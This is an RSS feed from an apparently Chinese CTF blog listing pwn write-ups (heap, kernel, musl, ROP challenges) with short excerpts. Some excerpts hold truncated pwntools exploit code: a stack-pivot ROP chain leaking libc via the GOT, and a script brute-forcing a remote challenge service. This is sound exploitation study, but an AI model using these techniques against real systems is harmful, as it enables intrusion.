<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>write-up on blog of chuj</title><link>https://www.cjovi.icu/tags/write-up.html</link><description>Recent content in write-up on blog of chuj</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><managingEditor>chujj31@gmail.com (chuj)</managingEditor><webMaster>chujj31@gmail.com (chuj)</webMaster><copyright>© chuj</copyright><lastBuildDate>Mon, 13 Sep 2021 11:19:00 +0000</lastBuildDate><atom:link href="https://www.cjovi.icu/tags/write-up/index.xml" rel="self" type="application/rss+xml"/><item><title>RCTF2021-musl-WP &amp;&amp; 5space 2021 *CTF 2022 强网杯 2022 Musl 赛题 exp</title><link>https://www.cjovi.icu/wp/1549.html</link><pubDate>Mon, 13 Sep 2021 11:19:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1549.html</guid><description>写在一年后 在现在向前看，发现自己也算半个 musl 大师了，自从 RCTF2021 的 musl 题之后的每场比赛只要出现 musl 我都能解出，也从最开始的写一天到现在的两三个小时打通，</description></item><item><title>InCTF2021-Ancienthouse/NodeKeeper-WP</title><link>https://www.cjovi.icu/wp/1537.html</link><pubDate>Mon, 16 Aug 2021 11:55:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1537.html</guid><description>Ancienthouse 这道题用了 2.2.5 版本 jemalloc 作为分配器，而不是传统的 ptmalloc。jemalloc 是 Facebook 开发的一个分配器，在 Firefox 和 redis 中都有应用。据说比 ptmalloc 有更好的性能</description></item><item><title>RaRCTF-PWN-WP</title><link>https://www.cjovi.icu/wp/1532.html</link><pubDate>Tue, 10 Aug 2021 10:49:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1532.html</guid><description>一场非常温暖人心的比赛，pwn 题比较简单，也是第一次在比赛里做完了 pwn 题。题目虽然挺简单，但是挺有意思的。做的虽然很累，但是体验尚可。 Archer 这题直</description></item><item><title>TCTF2021-uc_masteeer-WP</title><link>https://www.cjovi.icu/wp/1515.html</link><pubDate>Wed, 04 Aug 2021 12:24:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1515.html</guid><description>一道 Unicorn 的题目，之前没听说过这种东西，比赛的时候看都没看，现在来学习复现一下。 关于 unicorn，在看雪上有一篇 Unicorn 在 Android 的应用 写的很详细，这里参</description></item><item><title>DASCTF July X CBCTF 4th PWN WP</title><link>https://www.cjovi.icu/wp/1508.html</link><pubDate>Mon, 02 Aug 2021 22:13:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1508.html</guid><description>周末打了一下 DASCTF July X CBCTF 4th 这场比赛，其实这段时间也有一个什么极客巅峰的比赛，还有一个 UIUCTF。极客巅峰错过报名了（以为是晚上十点截止），再加</description></item><item><title>Balsn_CTF_2019-KrazyNote-WP</title><link>https://www.cjovi.icu/wp/1480.html</link><pubDate>Mon, 19 Jul 2021 20:57:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1480.html</guid><description>这道题的利用难度其实比较低，主要的难度在逆向上。说实话，乱七八糟的反编译代码是把我绕惨了。最近这段时间碰到了不少题目都是败在逆向上，我也意识</description></item><item><title>Jarvis OJ-HTTP-WP</title><link>https://www.cjovi.icu/wp/1477.html</link><pubDate>Sun, 18 Jul 2021 22:27:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1477.html</guid><description>最开始的时候我也是想成为一个 web 手的，但是在入门的时候就被绊倒在了门槛上。近期参与的比赛中有碰到 http 服务器后门相关的 pwn 题，看起来属于难度比较低的</description></item><item><title>QWB2021-notebook-WP</title><link>https://www.cjovi.icu/wp/1468.html</link><pubDate>Thu, 15 Jul 2021 23:16:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1468.html</guid><description>强网杯的时候我还一点都不会 kernel pwn，这道题看都没看。这两天尝试复现了一下，从前天下午一直弄到现在才搞出来，费了不少时间，也学到了一些东西，特</description></item><item><title>D^3CTF2019-knote-WP</title><link>https://www.cjovi.icu/wp/1455.html</link><pubDate>Tue, 13 Jul 2021 17:50:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1455.html</guid><description>本博客的第 200 篇文章，[font color=&amp;quot;#FA8072&amp;quot;] cheer! [/font] 这道题是老学长 Aris 出的，借着这道题学习了一下用 userfaultfd 机制稳定条件竞争的方法。我确实还是比较菜，又是完全照着 ha1vk 师</description></item><item><title>WCTF2018-klist-WP</title><link>https://www.cjovi.icu/wp/1446.html</link><pubDate>Mon, 12 Jul 2021 14:45:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1446.html</guid><description>本文参考自 ha1vk 师傅的linux kernel pwn学习之条件竞争(一) 借着这道题初步学习了一下 kernel 中条件竞争的利用。本题主要是通过条件竞争造成 UAF，然后通</description></item><item><title>PWNABLE.TW-Kidding-WP</title><link>https://www.cjovi.icu/wp/1439.html</link><pubDate>Fri, 09 Jul 2021 21:28:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1439.html</guid><description>很久没碰过 pwnable 的题目了，这道题其实很久之前也做过了，但是当时没有服务器接反弹的 shell，所以就作罢了，今天新买了一台服务器，不需要在上面跑什</description></item><item><title>*CTF2019-hackme-WP</title><link>https://www.cjovi.icu/wp/1433.html</link><pubDate>Thu, 08 Jul 2021 16:08:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1433.html</guid><description>首先看一下启动参数 qemu-system-x86_64 \ -m 256M \ -nographic \ -kernel bzImage \ -append &amp;#39;console=ttyS0 loglevel=3 oops=panic panic=1 kaslr&amp;#39; \ -monitor /dev/null \ -initrd initramfs.cpio \ -smp cores=4,threads=2 \ -cpu qemu64,smep,smap 2&amp;gt;/dev/null 开启了 kaslr 和 smep，smap。 这道题是一个堆上溢出造成的 UAF，</description></item><item><title>TCTF2021-listbook-WP</title><link>https://www.cjovi.icu/wp/1431.html</link><pubDate>Mon, 05 Jul 2021 22:47:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1431.html</guid><description>比赛和考试周相撞，所以比赛没有好好打，整场只看了这道题，比较尴尬的是最后也没看出来漏洞点。这个漏洞点让我觉得这个位置一定是个漏洞点，但是又触</description></item><item><title>2021强网杯线上赛 baby_diary [强网先锋]orw babypwn WP</title><link>https://www.cjovi.icu/wp/1399.html</link><pubDate>Sun, 13 Jun 2021 21:39:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1399.html</guid><description>强网杯这次我总共做了 3 道比较简单 pwn 题，还有三道题目学长做了，之后看情况复现一下。剩下 7 道基本上不会，还是需要继续学习 baby_diary 这道题就是 2.29+ libc 的 unlink 利用</description></item><item><title>XCTF-FINAL 2021-house of pig-WP</title><link>https://www.cjovi.icu/wp/1362.html</link><pubDate>Tue, 01 Jun 2021 23:47:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1362.html</guid><description>感觉自己还是太菜了，在比赛期间甚至都没有逆清楚这道题，即使学长给了分析好的 idb 文件也看不懂。当然当时身体不是很好也有一部分原因，但是还是觉得很</description></item><item><title>DASCTF2021.5-PWN-WP</title><link>https://www.cjovi.icu/wp/1360.html</link><pubDate>Sun, 30 May 2021 15:16:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1360.html</guid><description>由于有 XCTF-FINAL，所以虽然报了名，但是并没有打这场比赛，XCTF 也是零贡献，什么都不会了只好补一下 DASCTF 的题目，两题都很简单。 ticket 可以通</description></item><item><title>bluehat2021-portable-WP</title><link>https://www.cjovi.icu/wp/1357.html</link><pubDate>Thu, 27 May 2021 09:46:21 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1357.html</guid><description>很久之前打的比赛了，由于调试环境没配好，一直没复现这道题，前天突发奇想手动编译了一下 qemu 发现可以调了，所以就复现了一下 主要的洞在 这里的 switch 中，没</description></item><item><title>CISCN2021-silverwolf-WP</title><link>https://www.cjovi.icu/wp/1333.html</link><pubDate>Wed, 19 May 2021 16:18:56 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1333.html</guid><description>这次 CISCN 可以说是没参赛，只做了分数最低的 pwny，最后 realloc 调 one_gadget 栈的工作也不是我做的（一方面嫌烦另一方面刚准备调学长已经把 exp 写好了）。那题其实就是</description></item><item><title>XCTF 津门杯 2021-PwnCTFM-WP</title><link>https://www.cjovi.icu/wp/1317.html</link><pubDate>Tue, 11 May 2021 21:06:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1317.html</guid><description>比赛的时候不知道为什么，一直没想出来，赛后复现一下。 本题、本次比赛，最讨厌的地方就是每道 PWN 题都没给 libc，大幅降低了做题体验（好吧还是我太</description></item><item><title>Bluehat2021-slient-WP</title><link>https://www.cjovi.icu/wp/1302.html</link><pubDate>Thu, 29 Apr 2021 16:28:44 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1302.html</guid><description>这题没啥意思，就是爆破。由于无法输出任何东西，需要有能代表是正确的标志，可以使用 jmp 0 的方法，如果爆破正确则 jmp 0，否则 jmp 到一个乱七八糟的地方造</description></item><item><title>PWNABLE.TW-BREAK OUT-WP</title><link>https://www.cjovi.icu/wp/1301.html</link><pubDate>Tue, 27 Apr 2021 21:05:54 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1301.html</guid><description>这道题还是比较刺激的，一开始觉得很简单，直接改 note 指针修改 __free_hook 就行了，结果发现开启了写地址白名单，只允许在堆段上写数据，于是考虑 unsorted bin attack 改白名单，</description></item><item><title>XCTF-sentosa-WP</title><link>https://www.cjovi.icu/wp/1298.html</link><pubDate>Sat, 24 Apr 2021 16:19:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1298.html</guid><description>主要的漏洞点在 这里，当 Input length of your project name: 时输入 0，此处 v2 就会变成 -1，可以栈溢出。 栈环境如下 由于有 canary，有意义的溢出也仅有溢出到 v6。 v6 仅</description></item><item><title>Balsn_CTF_2019-PlainText-WP</title><link>https://www.cjovi.icu/wp/1290.html</link><pubDate>Thu, 22 Apr 2021 14:41:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1290.html</guid><description>这道题确实是比较难，卡了很多天，又花了很久才复现出来。 漏洞点分析 程序的流程比较清晰简单，在 add 函数中，存在明显的 off-by-null。 而 free 中</description></item><item><title>PlaidCTF2021-Plaidflix-WP</title><link>https://www.cjovi.icu/wp/1289.html</link><pubDate>Mon, 19 Apr 2021 08:55:41 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1289.html</guid><description>周末两天都在打这个比赛，毕竟是高质量的国际赛，难度确实是有点大，我也只做出了这道比较传统并且简单的题目。 首先是程序的逆向，不知道对 binary 做了什么</description></item><item><title>BUU-[OGeek2019 Final]OVM-WP</title><link>https://www.cjovi.icu/wp/1287.html</link><pubDate>Thu, 15 Apr 2021 22:20:31 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1287.html</guid><description>做的第二道虚拟机类题，此题还算比较简单，因为程序结构很清晰，也贴心的给出了调试信息，可以比较容易读懂程序。读懂程序之后找到漏洞点，利用就比较</description></item><item><title>BUU-ciscn_2019_qual_virtual-WP</title><link>https://www.cjovi.icu/wp/1270.html</link><pubDate>Wed, 14 Apr 2021 21:58:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1270.html</guid><description>一道虚拟机 pwn 题，大概是最入门的级别的了，也是此类题型我做的第一道，感觉主要的难点在逆向而非利用，理解程序行为和发现漏洞点后就不难做出了。 逆向</description></item><item><title>hitcon_ctf_2019_lazyhouse-WP</title><link>https://www.cjovi.icu/wp/1269.html</link><pubDate>Tue, 13 Apr 2021 23:26:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1269.html</guid><description>hitcon 的题目还是非常有质量且紧跟时代潮流的，在 2019 年连出两道和 libc 2.29 相关的堆利用题，一题是 one_punch，我的 WP，另一题就是就是本题，我并未在</description></item><item><title>PWNABLE.TW-Printable-WP</title><link>https://www.cjovi.icu/wp/1265.html</link><pubDate>Mon, 12 Apr 2021 22:17:29 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1265.html</guid><description>相当麻烦的格式化字符串和 .fini 数组利用结合的题目，由于是 pwnable 的题，这里只简单记录一下思路 首先，printf 是很裸的，但是执行完后就会直接 exit，</description></item><item><title>PWNABLE.TW-seethefile-WP</title><link>https://www.cjovi.icu/wp/1253.html</link><pubDate>Tue, 06 Apr 2021 14:46:38 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1253.html</guid><description>首先是前置的小 trick：关于/proc目录 题目提供了读取文件的功能，可以读除了 flag 之外的文件。自然可以想到通过 /proc/self/maps 来 leak 出 libc 的基地址。 然后在退出</description></item><item><title>PWNABLE.TW-Secret Garden-WP</title><link>https://www.cjovi.icu/wp/1250.html</link><pubDate>Sun, 04 Apr 2021 11:28:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1250.html</guid><description>这道题其实很简单，就是 unsorted bin 的 leak 加上一个 house of spirit，我 pwn 它可能主要还是为了减轻不做题的罪恶感。 visit 这个功能可以输出，我们只要释放一个 unsorted bi</description></item><item><title>PWNABLE.TW-secret_of_my_heart-WP</title><link>https://www.cjovi.icu/wp/1241.html</link><pubDate>Thu, 01 Apr 2021 23:47:03 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1241.html</guid><description>一道堆题，主要的漏洞点是 off-by-one。 可见这里会在读入的字符串末尾加零，那么只要我们申请形如 0x18 的大小的空间，写入 0x18 个字符，就可以溢出</description></item><item><title>PWNABLE.TW-unexploitable-WP</title><link>https://www.cjovi.icu/wp/1232.html</link><pubDate>Wed, 31 Mar 2021 20:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1232.html</guid><description>此题是一个 rop，分数挺高，难度不大。 The original challenge is on pwnable.kr and it is solvable. This time we fix the vulnerability and now we promise that the service is unexploitable. 题目描述是这样的，pwnable.kr 没刷过，也不知</description></item><item><title>PWNABLE.TW-De-ASLR-WP</title><link>https://www.cjovi.icu/wp/1227.html</link><pubDate>Tue, 30 Mar 2021 14:53:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1227.html</guid><description>这个 ROP 非常的麻烦 分析 流程就两句话 看起来似乎非常的简单，就是一个 gets 造成的无限溢出。但是并没有任何输出函数，所以 leak 非常困难。 思路 没有任何的 libc 地址</description></item><item><title>BUU-hitcon_ctf_2019_one_punch_man-WP</title><link>https://www.cjovi.icu/wp/1226.html</link><pubDate>Sun, 28 Mar 2021 16:49:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1226.html</guid><description>许久没做题了，今天花了半天的时间学习了一下 Tcache stash unlink attack 这种利用方式，做了一下 hitcon 的这道题。 其实第一次碰到这道题是在 hctf-game final 的时候，语神给这道题套了一个</description></item><item><title>BUU-hitcon_ctf_2019_one_punch-WP</title><link>https://www.cjovi.icu/wp/1226.html</link><pubDate>Sun, 28 Mar 2021 16:49:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1226.html</guid><description>许久没做题了，今天花了半天的时间学习了一下 Tcache stash unlink attack 这种利用方式，做了一下 hitcon 的这道题。 其实第一次碰到这道题是在 hctf-game final 的时候，语神给这道题套了一个</description></item><item><title>XCTF-shaxian-WP</title><link>https://www.cjovi.icu/wp/1221.html</link><pubDate>Fri, 26 Mar 2021 17:21:50 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1221.html</guid><description>这道题做出的人很少，本来以为很难，结果一点都不难，但是打不通远程，不出意外应该是靶机的问题。因为本机可以打通，但是远程打不通，为了证明特意去</description></item><item><title>PWNABLE.TW-BookWriter-WP</title><link>https://www.cjovi.icu/wp/1217.html</link><pubDate>Wed, 24 Mar 2021 18:53:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1217.html</guid><description>这是一道 house of orange，总体比较明显，比较模板化，但是有一处溢出点藏得比较深。 漏洞点 这里对 size_arr 进行了更新，使用的是 strlen，那么只要我们</description></item><item><title>PWNABLE.TW-Heap Paradise-WP</title><link>https://www.cjovi.icu/wp/1214.html</link><pubDate>Tue, 23 Mar 2021 23:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1214.html</guid><description>第二次碰到这题，上次无思路放弃了，这次觉得不能放弃了，就学习了一下，也算是开拓一下利用的思路吧。 又是如此，只有分配和回收，保护全开。和昨天做</description></item><item><title>PWNABLE.TW-Re-alloc Revenge-WP</title><link>https://www.cjovi.icu/wp/1210.html</link><pubDate>Sun, 21 Mar 2021 23:32:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1210.html</guid><description>前段时间做了一道利用 realloc 的题，感觉很有意思。看到此题的名字就有了兴趣，于是花了一天解了一下。 关于 realloc 的特性和攻击 _IO_FILE，本文不再赘述，</description></item><item><title>PWNABLE.TW-Spirited Away-WP</title><link>https://www.cjovi.icu/wp/1208.html</link><pubDate>Sat, 20 Mar 2021 21:09:44 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1208.html</guid><description>比较简单的栈溢出加堆溢出。 此处在 cnt &amp;gt;= 100 时有单字节溢出，会把 nbytes 溢出成 n 然后通过此处 修改 buf，使之指向栈上一段可控空间 比如这一段，我们可以轻易</description></item><item><title>PWNABLE.TW-death_note-WP</title><link>https://www.cjovi.icu/wp/1204.html</link><pubDate>Sat, 20 Mar 2021 17:05:37 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1204.html</guid><description>漏洞在于数组访问越界和堆栈可执行。在 add_note 函数中输入负数可以修改 got 表，使之指向一段我们可写的地址。自然地可以想到布置 shellcode getshell。然而本题</description></item><item><title>BUU-TWCTF_online_2019_asterisk_alloc-WP</title><link>https://www.cjovi.icu/wp/1203.html</link><pubDate>Fri, 19 Mar 2021 13:20:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1203.html</guid><description>这道题涉及到 realloc 的利用，还蛮新奇的，第一次接触。昨天晚上卡了一晚上没做出来，今天终于是解完了。 首先 realloc 在申请的空间不同时，行为也是不同的。我们记</description></item><item><title>BUU-rootersctf_2019_heaaaappppp-WP</title><link>https://www.cjovi.icu/wp/1195.html</link><pubDate>Wed, 17 Mar 2021 20:56:07 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1195.html</guid><description>此题的起名吸引了我去做它。题目不难，不过之前从来没有做过 Tcache dup 类的利用，也算是学习了新知识（考虑到这和 fastbin double free 相比除了简单不少之外没有什么区别，</description></item><item><title>BUU-sleepyHolder_hitcon_2016-WP</title><link>https://www.cjovi.icu/wp/1192.html</link><pubDate>Tue, 16 Mar 2021 20:48:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1192.html</guid><description>不得不说 hitcon 2016 那场比赛的堆题是真的都很牛叉，让我学到了很多东西。这道题和同场比赛中的 secret_holder 有在总体流程上几乎一样，但是利用方式不同。 这个程序除了 double</description></item><item><title>HgameFINAL-nohook-WP</title><link>https://www.cjovi.icu/wp/1183.html</link><pubDate>Sat, 13 Mar 2021 23:01:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1183.html</guid><description>Final 就做出这一道，第二道 webpwn 确实不太会，花了很长时间才搞出环境，最后无时间了。语神和我说出这个题也没想让我们做出来，感到一丝恶意和一丝释然。Hg</description></item><item><title>XCTF-house_of_grey-WP</title><link>https://www.cjovi.icu/wp/1176.html</link><pubDate>Thu, 11 Mar 2021 19:59:53 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1176.html</guid><description>看到题目还以为是堆利用，但是实际上是文件系统中的一个小 trick。 前置的是 /proc 目录的知识，可以看这篇文章 这个知识在 hgame 中第一次碰到，可看这篇 WP 中</description></item><item><title>HITCON-House of Orange-WP</title><link>https://www.cjovi.icu/wp/1167.html</link><pubDate>Tue, 09 Mar 2021 23:20:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1167.html</guid><description>House of Orange 是很有名的一种利用方法，早有耳闻，这次准备研究一下。 quick FAQ Q：为什么我日不穿 XCTF-adword 的靶机！ A：XCTF 提供的 libc 是错的 解决方案：用 LibcSe</description></item><item><title>XCTF-magic-WP</title><link>https://www.cjovi.icu/wp/1165.html</link><pubDate>Sun, 07 Mar 2021 19:50:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1165.html</guid><description>这篇 WP 没有写完！！！ 我还没有完成这篇 WP，因为有太多的源码没有研究，建议您看这一篇 写在前面 这道题是一个 _IO_FILE 利用，大概是我做过的最难的一道题，基</description></item><item><title>XCTF/BUU-secret_holder-WP</title><link>https://www.cjovi.icu/wp/1161.html</link><pubDate>Sat, 06 Mar 2021 08:22:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1161.html</guid><description>XCTF 提供了莫名其妙的附件，不能解压。所以只好自己找 binary。下载链接 前置知识 这道题出现了 mmap 的情况，这是我之前不曾碰到过的。 红框中申请了一个</description></item><item><title>XCTF-RCalc-WP</title><link>https://www.cjovi.icu/wp/1157.html</link><pubDate>Sat, 06 Mar 2021 00:00:10 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1157.html</guid><description>这是一个挺有意思的栈溢出题，很久没做过栈溢出了，居然看了很久才发现漏洞点是栈溢出.. 这里很明显有栈溢出，然后下面的 result = sub_400B92(); if ( result != v2 ) sub_400BD4(); 感觉像</description></item><item><title> XCTF/BUU-4th-QCTF-2018-babyheap-WP</title><link>https://www.cjovi.icu/wp/1144.html</link><pubDate>Fri, 05 Mar 2021 14:25:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1144.html</guid><description>3.04 这道题题目给的 libc 是 32 位的，但是程序本身是 64 位的..更令人崩溃的是查不出题目用的 libc，所以我基本是打不穿远程了，但是题目本身还是可以做一</description></item><item><title>XCTF-shell-WP</title><link>https://www.cjovi.icu/wp/1135.html</link><pubDate>Wed, 03 Mar 2021 19:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1135.html</guid><description>一道 8 分题，其实也没多难，就是思路很骚。我没想到，着实可惜。 读入全部使用 gets，随便溢出。我们需要的是把 v16 置为 1，自然的思路是通过溢出实现</description></item><item><title>XCTF-nobug-WP</title><link>https://www.cjovi.icu/wp/1134.html</link><pubDate>Tue, 02 Mar 2021 20:27:27 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1134.html</guid><description>这道题的 exp 应该是近期写的最短的，但是却是最令我迷惑的题。 一开始就是一个输入，然后输入的字符串会被传到这个函数里面进行处理 这个函数非常的复杂，</description></item><item><title>XCTF-onemanarmy-WP</title><link>https://www.cjovi.icu/wp/1131.html</link><pubDate>Mon, 01 Mar 2021 19:19:45 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1131.html</guid><description>这道题目还算简单，但是乍一看容易懵（反正我懵了）。 首先保护是全开的 分配这里非常的随意，但最多只能分配大小为 0x1FF 的 chunk，libc 版本为 2.</description></item><item><title>XCTF-Noleak-WP</title><link>https://www.cjovi.icu/wp/1123.html</link><pubDate>Sun, 28 Feb 2021 21:58:23 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1123.html</guid><description>HCTF-game 终于是结束了，我也没有借口再不做题了，所以从今天开始还是要继续每天一题（尽量吧）。 这道题目比较麻烦，是我做过的和堆相关的最麻烦的一道题。前</description></item><item><title>HGAME2021-WEEK4-PWN-WP</title><link>https://www.cjovi.icu/wp/1108.html</link><pubDate>Sun, 28 Feb 2021 20:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1108.html</guid><description>hgame 也差不多结束了，第四周只做了 pwn，别的方向都不太会。pwn 的题还是比较简单的。 house_of_cosmos 漏洞点看了很久才看出来 读入函数这里的 i 是 unsigned int，所以当</description></item><item><title>HGAME-WEEK3-WP</title><link>https://www.cjovi.icu/wp/1100.html</link><pubDate>Sun, 21 Feb 2021 20:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1100.html</guid><description>pwn blackgive 栈迁移，不要想复杂了 exp #!/usr/bin/env python # coding=utf-8 from pwn import * context(log_level = &amp;#39;debug&amp;#39;) context.terminal = [&amp;#39;tmux&amp;#39;,&amp;#39;splitw&amp;#39;,&amp;#39;-h&amp;#39;] sh = process(&amp;#34;./blackgive&amp;#34;) #sh = remote(&amp;#34;&amp;#34;) libc = ELF(&amp;#34;./libc6_2.27-3ubuntu1.4_amd64.so&amp;#34;) elf = ELF(&amp;#34;./blackgive&amp;#34;) pop_rdi_ret = 0x400813 bss_base = 0x6010A0 off = 0xA0 payload = &amp;#39;paSsw0rd&amp;#39;.ljust(0x20,&amp;#39;\x00&amp;#39;) payload += p64(bss_base + off - 0x8) + p64(0x4007A3) sh.recvuntil(&amp;#34;password:&amp;#34;) #gdb.attach(proc.pidof(sh)[0]) sh.send(payload) payload = &amp;#39;\x00&amp;#39; * off + p64(pop_rdi_ret)</description></item><item><title>HGAME2021-WEEK3-PWN-WP</title><link>https://www.cjovi.icu/wp/1090.html</link><pubDate>Tue, 16 Feb 2021 16:08:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1090.html</guid><description>blackgive 栈迁移 exp #!/usr/bin/env python # coding=utf-8 from pwn import * context(log_level = &amp;#39;debug&amp;#39;) context.terminal = [&amp;#39;tmux&amp;#39;,&amp;#39;splitw&amp;#39;,&amp;#39;-h&amp;#39;] sh = process(&amp;#34;./blackgive&amp;#34;) #sh = remote(&amp;#34;&amp;#34;) libc = ELF(&amp;#34;./libc6_2.27-3ubuntu1.4_amd64.so&amp;#34;) elf = ELF(&amp;#34;./blackgive&amp;#34;) pop_rdi_ret = 0x400813 bss_base = 0x6010A0 off = 0xA0 payload = &amp;#39;paSsw0rd&amp;#39;.ljust(0x20,&amp;#39;\x00&amp;#39;) payload += p64(bss_base + off - 0x8) + p64(0x4007A3) sh.recvuntil(&amp;#34;password:&amp;#34;) #gdb.attach(proc.pidof(sh)[0]) sh.send(payload) payload = &amp;#39;\x00&amp;#39; * off + p64(pop_rdi_ret) + p64(elf.got[&amp;#39;puts&amp;#39;]) + p64(elf.sym[&amp;#39;puts&amp;#39;]) + p64(0x40070a) sh.sendlineafter(&amp;#34;!\n&amp;#34;,payload) puts_addr</description></item><item><title>HGAME-WEEK2-WP</title><link>https://www.cjovi.icu/wp/1078.html</link><pubDate>Sun, 14 Feb 2021 20:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1078.html</guid><description>RE fake_debugger beta 没搞懂，不同位置的不同字符对应的编码都不同，没什么思路，写了个脚本爆破了 #!/usr/bin/env python # coding=utf-8 from pwn import * #context(log_level = &amp;#39;debug&amp;#39;) total_char = &amp;#39;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_=+|/?.&amp;gt;,&amp;lt;:;\&amp;#34;\&amp;#39;\\`~!@#$%^&amp;amp;*(){}[]&amp;#39; def test(flag_now): sh = remote(&amp;#34;101.132.177.131&amp;#34;,9999) payload = flag_now sh.sendlineafter(&amp;#34;now!\n&amp;#34;,payload) for i in range(2 * len(flag_now)): sh.sendlineafter(&amp;#34;---\n&amp;#34;,&amp;#39; &amp;#39;)</description></item><item><title>HGAME2021-WEEK2-PWN-WP</title><link>https://www.cjovi.icu/wp/1079.html</link><pubDate>Tue, 09 Feb 2021 19:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://www.cjovi.icu/wp/1079.html</guid><description>rop_primary 没什么难度，就是单纯的 ROP #!/usr/bin/env python # coding=utf-8 from pwn import * from LibcSearcher import * import re elf = ELF(&amp;#34;./rop_primary&amp;#34;) pop_rdi_ret = 0x401613 pop_rsi_r15_ret = 0x401611 pop_r14_r15_ret = 0x401610 def matrixMul(A, B): if len(A[0]) == len(B): res = [[0] * len(B[0]) for i in range(len(A))] for i in range(len(A)): for j in range(len(B[0])): for k in range(len(B)): 